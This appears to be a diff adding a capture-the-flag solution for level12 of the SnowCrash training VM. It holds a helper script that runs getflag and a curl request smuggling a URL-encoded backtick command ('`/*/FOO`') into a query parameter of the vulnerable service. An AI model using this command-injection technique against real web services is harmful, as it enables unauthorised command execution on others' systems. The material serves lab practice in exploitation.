@@ -1,0 +1,9 @@
+level12@SnowCrash:~$ cat /tmp/FOO
+#! /bin/bash
+/bin/getflag > /tmp/titi
+
+
+# '`/*/FOO`' => %27%60%2F*%2FFOO%60%27
+curl 10.12.1.121:4646/?x=%27%60%2F*%2FFOO%60%27
+
+cat /tmp/titi
